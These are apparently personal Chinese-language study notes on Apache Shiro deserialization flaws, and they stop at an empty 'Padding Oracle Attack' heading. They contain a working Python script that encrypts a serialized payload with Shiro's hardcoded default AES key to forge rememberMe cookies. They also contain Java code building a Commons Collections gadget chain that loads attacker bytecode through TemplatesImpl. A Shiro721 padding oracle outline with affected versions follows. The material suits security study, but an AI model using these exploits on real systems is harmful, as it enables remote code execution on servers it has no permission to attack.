# Shiro

# Shiro反序列化漏洞

## Shiro550

漏洞原因是AES加密的key值在程序中写死

ase脚本

```python
import sys
import base64
import uuid
from random import Random
from Crypto.Cipher import AES

def get_file_data(filename):
	with open(filename, 'rb') as f:
		data = f.read()
	return data

def ase_enc(data):
	BS = AES.block_size
	pad = lambda s: s + ((BS - len(s) % BS) * chr(BS - len(s) % BS)).encode()
	key = "kPH+bIxk5D2deZiIxcaaaA=="
	mode = AES.MODE_CBC
	IV = uuid.uuid4().bytes
	encryptor = AES.new(base64.b64decode(key), mode, IV)
	ciphertext = base64.b64encode(IV + encryptor.encrypt(pad(data)))
	return ciphertext

def aes_dec(enc_data):
	enc_data = base64.b64decode(enc_data)
	unpad = lambda s : s[:-s[-1]]
	key = "kPH+bIxk5D2deZiIxcaaaA=="
	mode = AES.MODE_CBC
	IV = enc_data[:16]
	encryptor = AES.new(base64.b64decode(key), mode, IV)
	plaintext = encryptor.decrypt(enc_data[16:])
	plaintext = unpad(plaintext)
	return plaintext

if __name__ == '__main__':
	#enc_data = b''
	#plaintext = aes_dec(enc_data)
	#print(plaintext)
	data = get_file_data('ser.bin')
	print(ase_enc(data))
```

### Shiro中CC链的使用

在中间webapp的类加载的过程中数组无法通过，通过多条cc链的缝合出的无数组的cc链

```java
package org.shiro.attack;

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;
import org.apache.commons.collections.functors.InvokerTransformer;

import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.HashMap;
import java.util.Map;

public class ShiroCC {
    public static void main(String[] args) throws Exception {
        //CC3
        TemplatesImpl templates = new TemplatesImpl();
        Class tc = templates.getClass();
        Field nameField = tc.getDeclaredField("_name");
        nameField.setAccessible(true);
        nameField.set(templates, "aaa");
        Field bytecodeField = tc.getDeclaredField("_bytecodes");
        bytecodeField.setAccessible(true);

        byte[] code = Files.readAllBytes(Paths.get("D:\\JavaSec\\CCdebug\\target\\classes\\org\\cc\\cc1\\test.class"));
        byte[][] codes = {code};
        bytecodeField.set(templates, codes);

        //CC2
        InvokerTransformer invokerTransformer = new InvokerTransformer("newTransformer", null, null);

        //CC6
        HashMap<Object, Object> map = new HashMap<>();
        Map<Object, Object> lazymap = LazyMap.decorate(map, new ConstantTransformer(1));

        TiedMapEntry tiedMapEntry = new TiedMapEntry(lazymap, templates);

        HashMap<Object, Object> map2 = new HashMap<>();
        map2.put(tiedMapEntry, "bbb");
        lazymap.remove(templates);

        Class c = LazyMap.class;
        Field factoryField = c.getDeclaredField("factory");
        factoryField.setAccessible(true);
        factoryField.set(lazymap, invokerTransformer);

        //payload序列化写入文件，模拟网络传输

        FileOutputStream f = new FileOutputStream("payload.bin");
        ObjectOutputStream fout = new ObjectOutputStream(f);
        fout.writeObject(map2);

        //2.服务端读取文件，反序列化，模拟网络传输
        FileInputStream fi = new FileInputStream("payload.bin");
        ObjectInputStream fin = new ObjectInputStream(fi);
        //服务端反序列化
        fin.readObject();
    }
}
```

## Shiro721（****CVE-2019-12422****）——Padding Orracle

影响版本

> 1.2.5,
> 
> 
> 1.2.6,
> 
> 1.3.0,
> 
> 1.3.1,
> 
> 1.3.2,
> 
> 1.4.0-RC2,
> 
> 1.4.0,
> 
> 1.4.1
> 

将shiro550的aes密钥从硬编码改成了动态生成，加密方法为AES-CBC,可以用之前某题的Padding Oracle Attack去探测正确的rememeberMe

大概利用方法就是合法账户登录后用合法的rememberMe来结合脚本对目标网站的返回值来爆破出正确的cookie

### Padding Oracle Attack